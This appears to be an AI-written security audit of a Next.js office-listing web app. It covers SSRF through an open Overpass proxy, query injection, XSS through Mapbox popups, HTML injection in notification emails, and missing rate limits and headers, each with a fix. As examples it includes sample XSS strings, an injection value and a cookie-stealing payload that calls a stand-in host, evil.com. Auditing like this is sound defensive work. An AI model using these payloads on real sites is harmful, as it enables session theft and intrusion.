# Security Audit — next-office.io

**Audit Date:** 2026-02-25
**Auditor:** Claude Opus 4.6 (Senior Security Review)
**Scope:** Main project codebase (`src/`), excluding `LP/` subfolder. Includes all API routes, middleware, client components, environment configuration, and dependencies.

## Executive Summary

The next-office.io codebase has **two critical vulnerabilities** that must be fixed before launch: an open Overpass API proxy that accepts arbitrary user-controlled queries (server-side request forgery), and HTML injection via unsanitized third-party data rendered through Mapbox's `.setHTML()`. Beyond these, the application lacks rate limiting on all lead endpoints, has no CSRF protection, missing security headers, and multiple instances of user-controlled data interpolated into HTML email templates without escaping. The overall security posture is typical for an early-stage B2B platform but requires hardening before production traffic.

---

## P0 — Must Fix Before Launch

### P0-1: Open Overpass API Proxy — Server-Side Request Forgery (SSRF)

**Affected file:** `src/app/(main)/api/transit/route.ts` (lines 3-7, 13-16)

**Description:** The `/api/transit` route accepts an arbitrary Overpass QL query string from the `?query=` URL parameter and forwards it verbatim to `https://overpass-api.de/api/interpreter`. There is zero validation of the query content. Any anonymous internet user can craft requests through this endpoint.

**Risk:**
- Attacker uses the server as an open proxy to abuse the Overpass API (rate-limited per IP; your server IP gets banned, breaking transit features for all users).
- Overpass QL supports `out meta;` and other directives that return large payloads (100+ MB), causing memory exhaustion on your Vercel function.
- Attacker can enumerate OSM data (user edits, changeset metadata) through your proxy, masking their identity.
- The Overpass API has no authentication — your server becomes an amplification vector.

**Evidence:** Line 4 reads `query` directly from URL params; line 13-16 sends it to Overpass with no filtering:
```typescript
const query = request.nextUrl.searchParams.get("query");
// ...
const res = await fetch("https://overpass-api.de/api/interpreter", {
  method: "POST",
  body: `data=${encodeURIComponent(query)}`,
```

**Recommended fix:** Replace the open proxy with a parameterized endpoint. Accept only `lat`, `lng`, and `type` (ubahn/sbahn/bus) parameters. Construct the Overpass query server-side (like `/api/transit-lines` and `/api/districts` already do). Remove the `?query=` parameter entirely.

---

### P0-2: Overpass QL Injection via Unvalidated lat/lng Parameters

**Affected files:**
- `src/app/(main)/api/transit-lines/route.ts` (lines 9-13)
- `src/app/(main)/api/districts/route.ts` (lines 83-87)

**Description:** Both routes read `lat` and `lng` from URL search params as strings and interpolate them directly into Overpass QL query strings without validating that they are numeric. An attacker can inject arbitrary Overpass QL syntax by passing crafted values like `lat=52.5);node["amenity"](around:50000,52.5,13.4);out meta;(/` which breaks out of the intended query and executes attacker-controlled Overpass QL.

**Evidence (transit-lines/route.ts, line 13):**
```typescript
const query = `[out:json][timeout:25];(relation["type"="route"]["route"="subway"](around:10000,${lat},${lng});...`;
```

**Risk:**
- Crafted queries can extract arbitrary OSM data or cause expensive queries that time out, consuming your serverless function budget.
- Could be used to make the Overpass API ban your server's IP range.

**Recommended fix:** Parse `lat` and `lng` with `parseFloat()` and validate they are finite numbers within geographic bounds (-90 to 90 for lat, -180 to 180 for lng). Reject non-numeric values with 400 status:
```typescript
const latNum = parseFloat(lat);
const lngNum = parseFloat(lng);
if (!Number.isFinite(latNum) || !Number.isFinite(lngNum) ||
    latNum < -90 || latNum > 90 || lngNum < -180 || lngNum > 180) {
  return NextResponse.json({ error: "Invalid coordinates" }, { status: 400 });
}
```

---

### P0-3: XSS via Unsanitized Overpass Data in Mapbox .setHTML()

**Affected file:** `src/components/search-map-inner.tsx` (line 148)

**Description:** The transit line tooltip uses Mapbox's `.setHTML()` method with values (`colour` and `ref`) sourced directly from OpenStreetMap data returned by the Overpass API. OSM is a public wiki — anyone can edit tag values. A malicious OSM edit could set `colour` to `"><img src=x onerror=alert(1)>` or `ref` to `<script>...</script>`, achieving stored XSS on every user who views transit overlays in that city.

**Evidence:**
```typescript
const colour = feature.properties?.colour || "#888";
const ref = feature.properties?.ref || "";
popupRef.current = new mapboxgl.Popup(...)
  .setHTML(`<span style="background:${colour};...">${ref}</span>`)
```

**Risk:** Full XSS — session hijacking, form data theft, redirect to phishing page. This is a stored XSS vector because the data persists in OSM and is cached in localStorage for 24 hours.

**Recommended fix:** Use `.setText()` instead of `.setHTML()`, or sanitize both values:
```typescript
const safeColour = /^#[0-9a-fA-F]{3,8}$/.test(colour) ? colour : "#888";
const safeRef = ref.replace(/[<>"'&]/g, "");
```
Alternatively, construct the DOM element programmatically and use `.setDOMContent()`.

---

### P0-4: HTML Injection in Notification Emails (Stored XSS via Email)

**Affected files:**
- `src/app/(main)/api/leads/route.ts` (lines 76-99)
- `src/app/(lp)/api/lp-leads/route.ts` (lines 131-163)

**Description:** User-supplied values (`body.name`, `body.email`, `body.phone`, `body.message`, `body.listing_name`, `body.city`, `body.team_size`, `body.company`, `body.utm_source`, `body.utm_term`) are interpolated directly into the HTML email template without HTML entity escaping.

**Evidence (leads/route.ts, line 88):**
```typescript
html: `...
  <tr><td>Name</td><td>${body.name}</td></tr>
  <tr><td>E-Mail</td><td><a href="mailto:${body.email}">${body.email}</a></td></tr>
  ...
  ${body.message ? `<p>${body.message}</p>` : ""}
```

**Risk:**
- An attacker submits a lead with `name: "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>"`. When the team opens the notification email, the injected HTML executes in their email client (many email clients render HTML).
- The `message` field is entirely attacker-controlled and rendered as raw HTML.
- The `mailto:` href with unescaped email could inject additional attributes.

**Recommended fix:** HTML-escape all user input before embedding in the email template. Create a utility function:
```typescript
function escapeHtml(str: string): string {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;")
    .replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}
```
Apply to every `body.*` value used in the HTML template.

---

### P0-5: No Rate Limiting on Lead Submission Endpoints

**Affected files:**
- `src/app/(main)/api/leads/route.ts`
- `src/app/(lp)/api/lp-leads/route.ts`

**Description:** Both POST endpoints have no rate limiting. An attacker can submit thousands of fake leads per second from a single machine. There is no per-IP throttle, no per-email deduplication, no CAPTCHA, and no request-size limits.

**Risk:**
- Supabase insert quota exhausted (free tier: ~500 req/sec).
- Resend email quota exhausted (free tier: 100 emails/day; paid plans still have limits). Each lead fires an email to the notification address — inbox flooded.
- Database filled with spam data, making real leads hard to find.
- Potential financial impact if on paid Supabase/Resend plans (cost-based DoS).

**Recommended fix:** Implement rate limiting at the middleware or route level. Options:
1. **Vercel Edge Config + Upstash Redis**: Use `@upstash/ratelimit` for distributed rate limiting (e.g., 5 submissions per IP per minute).
2. **Simple in-memory**: For MVP, a Map-based rate limiter in the route handler (note: resets on cold start).
3. **Turnstile/reCAPTCHA**: Add Cloudflare Turnstile (invisible CAPTCHA) to both forms.

---

## P1 — Should Fix Before Launch

### P1-1: No CSRF Protection on Lead Form Endpoints

**Affected files:**
- `src/app/(main)/api/leads/route.ts`
- `src/app/(lp)/api/lp-leads/route.ts`

**Description:** Both POST endpoints accept `application/json` requests with no CSRF token validation and no `Origin` header check. While browsers enforce SameSite cookie policies for cookie-based auth, these endpoints are fully public (no auth). The risk is that a malicious website can auto-submit forms on behalf of a visitor.

**Risk:** An attacker's website could submit fake leads attributed to real users, potentially associating someone's email/phone with spam inquiries. Lower severity than authenticated endpoints, but still worth mitigating for a production B2B platform.

**Recommended fix:**
1. Validate the `Origin` or `Referer` header matches `next-office.io`.
2. Alternatively, implement a double-submit token pattern using a cookie set by the middleware.

---

### P1-2: Missing Security Headers (CSP, X-Frame-Options, HSTS, etc.)

**Affected files:**
- `next.config.ts` (no `headers` configuration)
- `src/middleware.ts` (no security headers set)

**Description:** The application sets no security response headers. There is no Content Security Policy, no X-Frame-Options, no X-Content-Type-Options, no Referrer-Policy, and no Strict-Transport-Security header.

**Risk:**
- **No CSP**: If an XSS vector is found, there is no defense-in-depth to block inline script execution or restrict resource origins.
- **No X-Frame-Options**: The site can be embedded in iframes on malicious sites (clickjacking). An attacker could overlay the lead form in a transparent iframe to trick users into submitting data.
- **No HSTS**: Browsers won't enforce HTTPS-only access after first visit.

**Recommended fix:** Add security headers in `next.config.ts`:
```typescript
async headers() {
  return [{
    source: "/(.*)",
    headers: [
      { key: "X-Frame-Options", value: "DENY" },
      { key: "X-Content-Type-Options", value: "nosniff" },
      { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
      { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
      { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
      { key: "Content-Security-Policy", value: "default-src 'self'; script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://images.ctfassets.net https://images.unsplash.com https://api.mapbox.com https://tiles.mapbox.com; connect-src 'self' https://api.mapbox.com https://tiles.mapbox.com https://events.mapbox.com; frame-ancestors 'none';" },
    ],
  }];
}
```

---

### P1-3: Email Validation Regex Accepts Invalid Addresses

**Affected files:**
- `src/app/(lp)/api/lp-leads/route.ts` (line 51)
- `src/components/lp/sections/lead-form-section.tsx` (line 78)

**Description:** The email regex `^[^\s@]+@[^\s@]+\.[^\s@]+$` is too permissive. It accepts strings like `a@b.c`, `@.@`, `"<script>"@x.y`, and extremely long addresses (no length limit).

**Note:** The main site's `/api/leads` route has NO email validation at all — it only checks `!body.email` (truthy check). Any non-empty string passes.

**Risk:**
- Invalid emails stored in Supabase waste team follow-up time.
- Exotic email strings could cause issues in downstream systems (Resend rendering, CRM imports).
- The main route's lack of email validation is worse — `body.email` could be `true`, an object, or a very long string.

**Recommended fix:** Use a proper validation library (e.g., `zod` with `z.string().email()`), or at minimum enforce length limits and stricter regex. Apply validation consistently to both routes.

---

### P1-4: Google Ads Click IDs in Cookies Not Validated

**Affected file:** `src/middleware.ts` (lines 23-34)

**Description:** The middleware reads `gclid`, `gbraid`, and `wbraid` from URL parameters and stores them directly in HTTP-only cookies with 90-day expiry. There is no validation of the values — no length limit, no character whitelist, no format check.

**Evidence:**
```typescript
const value = params.get(key);
if (value) {
  response.cookies.set(`${COOKIE_PREFIX}${key}`, value, { ... });
}
```

**Risk:**
- An attacker can set `?gclid=` to a very long string (e.g., 100KB), which gets stored as a cookie. This cookie is then sent with every subsequent request, causing large request headers that may exceed server limits or slow down requests.
- Cookie values end up in Supabase — unbounded string storage.
- Empty strings pass the truthy check (e.g., `?gclid=` sets an empty cookie, but `if (value)` actually catches this in JS). However, a single-space `?gclid=%20` would pass.

**Recommended fix:**
```typescript
const value = params.get(key);
if (value && value.length > 0 && value.length <= 150 && /^[\w\-=.]+$/.test(value)) {
  response.cookies.set(...);
}
```

---

### P1-5: Service Role Key Used for Public-Facing Lead Inserts

**Affected files:**
- `src/app/(main)/api/leads/route.ts` (line 8)
- `src/app/(lp)/api/lp-leads/route.ts` (line 8)

**Description:** Both lead API routes use `SUPABASE_SERVICE_ROLE_KEY` to create the Supabase client. The service role key bypasses all Row Level Security (RLS) policies and has full database access (read, write, delete on all tables).

**Risk:** If the API route has any vulnerability that allows arbitrary query execution (e.g., if body fields are used in raw SQL, or if the route is modified to support dynamic table names), the service role key grants full database access. Even without such a bug, principle of least privilege is violated.

**Recommended fix:**
1. Create a limited Supabase role that can only INSERT into the `leads` table.
2. Use the anon key with RLS policies that allow INSERT but not SELECT/UPDATE/DELETE on `leads`.
3. At minimum, ensure RLS is enabled on the `leads` table even when using service role.

---

### P1-6: No Input Size/Type Validation on Lead Request Bodies

**Affected files:**
- `src/app/(main)/api/leads/route.ts` (lines 15-53)
- `src/app/(lp)/api/lp-leads/route.ts` (lines 29-103)

**Description:** Neither route validates the type or size of request body fields. The `request.json()` call will parse any valid JSON. Fields like `body.message`, `body.name`, `body.phone` have no maximum length. `body.team_size` in the main route is passed directly without `Number()` conversion. The message field is concatenated with UTM metadata in lp-leads without length limits.

**Risk:**
- An attacker can submit a 10MB `message` field, which gets stored in Supabase and sent in an email.
- Type confusion: `body.team_size` could be an object or array in the main route (lp-leads converts to Number).
- Large payloads consume serverless function memory and Supabase storage.

**Recommended fix:** Validate and truncate all fields. Use a schema validation library (zod is already in dependencies):
```typescript
const schema = z.object({
  name: z.string().min(1).max(200),
  email: z.string().email().max(254),
  phone: z.string().max(30).optional(),
  team_size: z.number().int().min(1).max(10000).optional(),
  message: z.string().max(2000).optional(),
  // ...
});
```

---

### P1-7: Mapbox Access Token Exposed to Client

**Affected file:** `src/lib/map-config.ts` (line 1)

**Description:** The Mapbox access token is exposed via `NEXT_PUBLIC_MAPBOX_ACCESS_TOKEN`. This is by design (Mapbox GL JS requires a client-side token), but the token may have unrestricted scopes.

**Additional exposure:** `src/components/listing-map-inner.tsx` (line 143) uses the same token to call the Mapbox Search API directly from client-side code:
```typescript
const url = `https://api.mapbox.com/search/searchbox/v1/category/${mbCategory}?...&access_token=${MAPBOX_TOKEN}`;
```

**Risk:**
- If the token is not URL-restricted in the Mapbox dashboard, anyone who inspects the page source can use it for their own Mapbox projects, consuming your tile/search quota.
- Mapbox charges per map load and per search API call above free tier.

**Recommended fix:**
1. Restrict the token to `next-office.io` in the Mapbox dashboard (URL restrictions).
2. Create a separate token with limited scopes for the Search API calls (or proxy them through a server-side API route).

---

## P2 — Post-Launch / Low Priority

### P2-1: Unvalidated Redirect on LP Form Submission

**Affected file:** `src/components/lp/sections/lead-form-section.tsx` (line 262)

**Description:** After successful form submission, the user is redirected to `/lp/${values.city}/danke`. The `values.city` comes from a `<select>` element with predefined options, so direct user-controlled open redirect is unlikely. However, if the city list is ever dynamically generated from user input or if the select validation is bypassed, this could become an open redirect.

**Risk:** Low — currently constrained by the select options list. Monitor if city source changes.

**Recommended fix:** Validate that `values.city` matches an allowed city slug before redirecting.

---

### P2-2: localStorage Cache Poisoning

**Affected files:**
- `src/components/search-map-inner.tsx` (lines 50-62)
- `src/components/listing-map-inner.tsx` (lines 53-71)

**Description:** Transit line and POI data fetched from the API is cached in localStorage with a 24-hour TTL. The cache key is derived from coordinates. If an attacker can manipulate the API response (e.g., via P0-1 SSRF or a compromised Overpass API), the poisoned data persists for 24 hours in the user's browser.

**Risk:** Combined with P0-3 (XSS via setHTML), cached poisoned data means the XSS payload persists even after the malicious OSM edit is reverted.

**Recommended fix:** After fixing P0-3, this becomes low risk. Consider adding integrity checks or reducing TTL.

---

### P2-3: Blog Markdown Content Rendered Without Sanitization

**Affected file:** `src/components/markdown-content.tsx` (line 10)

**Description:** Blog content is rendered via `react-markdown`, which by default does NOT allow raw HTML (safe by default). However, if the `rehypeRaw` plugin is ever added, or if markdown content is sourced from untrusted input instead of local `.md` files, this could become an XSS vector.

**Risk:** Currently low — blog posts are local filesystem files under developer control. `react-markdown` without `rehypeRaw` escapes HTML tags in markdown.

**Recommended fix:** No immediate action needed. Add a comment documenting that `rehypeRaw` must never be enabled without a sanitizer like `rehype-sanitize`.

---

### P2-4: JSON-LD Structured Data from Listings Data

**Affected files:**
- `src/app/(main)/blog/[slug]/page.tsx` (line 79)
- `src/app/(main)/[city]/[listing]/page.tsx` (line 177)
- `src/components/lp/sections/faq-section.tsx` (line 50)

**Description:** JSON-LD structured data is rendered via `dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}`. The `JSON.stringify` call provides safe escaping for JSON values. However, if listing data (sourced from `listings.json` which came from Contentful) contains `</script>` in a field value, it could break out of the script tag.

**Risk:** Low — `JSON.stringify` escapes quotes but does NOT escape `</script>`. If a listing name contains `</script><script>alert(1)</script>`, it would break out. However, Contentful data is admin-controlled.

**Recommended fix:** Use a safe JSON-LD serializer that escapes `</` sequences:
```typescript
JSON.stringify(jsonLd).replace(/</g, "\\u003c")
```

---

### P2-5: Error Messages Leak Supabase Error Details to Logs

**Affected files:**
- `src/app/(main)/api/leads/route.ts` (line 57)
- `src/app/(lp)/api/lp-leads/route.ts` (line 106)

**Description:** Supabase errors are logged with `console.error("Supabase insert error:", error)`. In Vercel, these logs are visible in the dashboard. The error object may contain table names, column names, constraint names, or other schema details.

**Risk:** If an attacker can trigger specific errors (e.g., constraint violations), the Vercel logs expose database schema information. The user-facing error message is generic (good), but the server logs may be accessible to a wider team than intended.

**Recommended fix:** Log only the error code and message, not the full error object:
```typescript
console.error("Lead insert failed:", { code: error.code, message: error.message });
```

---

### P2-6: No Environment Variable Validation at Startup

**Affected files:**
- `src/app/(main)/api/leads/route.ts` (lines 7-11)
- `src/app/(lp)/api/lp-leads/route.ts` (lines 7-11)
- `src/lib/map-config.ts` (line 1)

**Description:** Environment variables are accessed with the non-null assertion operator (`!`) but never validated. If `SUPABASE_SERVICE_ROLE_KEY` or `RESEND_API_KEY` is missing, the app will start but crash with an unhelpful error on the first API request.

**Risk:** Silent failures in staging/production if env vars are misconfigured. The `!` assertion hides the actual cause of failures.

**Recommended fix:** Add a startup validation module (e.g., `src/lib/env.ts`) using zod:
```typescript
import { z } from "zod";
const envSchema = z.object({
  NEXT_PUBLIC_SUPABASE_URL: z.string().url(),
  SUPABASE_SERVICE_ROLE_KEY: z.string().min(1),
  RESEND_API_KEY: z.string().startsWith("re_"),
  NOTIFICATION_EMAIL: z.string().email(),
  NEXT_PUBLIC_MAPBOX_ACCESS_TOKEN: z.string().min(1),
});
export const env = envSchema.parse(process.env);
```

---

### P2-7: Placeholder Google Ads Conversion Values in Source

**Affected file:** `src/components/lp/sections/lead-form-section.tsx` (line 35)

**Description:** The `fireConversionEvent` function contains a hardcoded placeholder: `send_to: "AW-XXXXXXXXXX/XXXXXXXXXX"`. This will fire invalid conversion events to Google Ads if the code runs in production.

**Risk:** No security risk, but a data quality concern. Invalid conversion tracking wastes ad budget by not attributing conversions correctly.

**Recommended fix:** Move the conversion ID/label to environment variables (as done in `conversion-tracker.tsx`) and guard against placeholder values.

---

### P2-8: Transit API Routes Have No Timeout or Error Handling for Large Responses

**Affected files:**
- `src/app/(main)/api/transit-lines/route.ts` (lines 15-20)
- `src/app/(main)/api/districts/route.ts` (lines 89-94)

**Description:** Unlike `/api/transit` which has a 12-second timeout, the `transit-lines` and `districts` routes have no timeout on the Overpass API fetch. The Overpass query has `[timeout:25]` in the QL, but the HTTP fetch itself has no AbortController. Additionally, `res.json()` is called without checking `res.ok` — if Overpass returns an error HTML page, `res.json()` will throw an unhandled exception.

**Risk:** Serverless function hangs indefinitely if Overpass is unresponsive. Uncaught JSON parse errors return a 500 with default Next.js error page.

**Recommended fix:** Add AbortController timeout and check `res.ok` before parsing JSON (as `/api/transit` already does).

---

## Summary Table

| ID | Severity | Finding | Status |
|------|----------|---------|--------|
| P0-1 | Critical | Open Overpass proxy (SSRF) | Confirmed — NEW |
| P0-2 | Critical | Overpass QL injection via lat/lng | Confirmed — NEW |
| P0-3 | Critical | XSS via .setHTML() with Overpass data | Confirmed — NEW |
| P0-4 | Critical | HTML injection in notification emails | Confirmed — NEW |
| P0-5 | Critical | No rate limiting on lead endpoints | Confirmed — from CONCERNS.md |
| P1-1 | High | No CSRF protection on lead forms | Confirmed — from CONCERNS.md |
| P1-2 | High | Missing security headers (CSP, X-Frame-Options, HSTS) | Confirmed — NEW |
| P1-3 | Medium | Weak email validation regex | Confirmed — from CONCERNS.md, expanded |
| P1-4 | Medium | Click ID cookies not validated | Confirmed — from CONCERNS.md |
| P1-5 | Medium | Service role key for public inserts | Confirmed — from CONCERNS.md |
| P1-6 | Medium | No input size/type validation on request bodies | Confirmed — NEW |
| P1-7 | Medium | Mapbox token potentially unrestricted | Confirmed — NEW |
| P2-1 | Low | Unvalidated redirect on LP form | Confirmed — NEW |
| P2-2 | Low | localStorage cache poisoning | Confirmed — NEW |
| P2-3 | Low | Blog markdown safe by default, fragile if changed | Confirmed — NEW |
| P2-4 | Low | JSON-LD script tag escape risk | Confirmed — NEW |
| P2-5 | Low | Error logging may leak schema | Confirmed — NEW |
| P2-6 | Low | No env var validation at startup | Confirmed — NEW |
| P2-7 | Low | Placeholder conversion values in source | Confirmed — from CONCERNS.md |
| P2-8 | Low | Transit API routes missing timeout/error handling | Confirmed — expanded from CONCERNS.md |

**Total findings: 20** (5 P0, 7 P1, 8 P2)
**New findings not in CONCERNS.md: 13**
**Confirmed from CONCERNS.md: 7** (all verified against actual code)

---

*Note: `npm audit` was not run due to environment restrictions. Dependency versions in `package.json` should be checked manually. Key packages to audit: `react-map-gl@8.1.0` (Oct 2023, known outdated), `gray-matter@4.0.3`, `resend@6.9.2`.*

---

*Security audit completed 2026-02-25.*
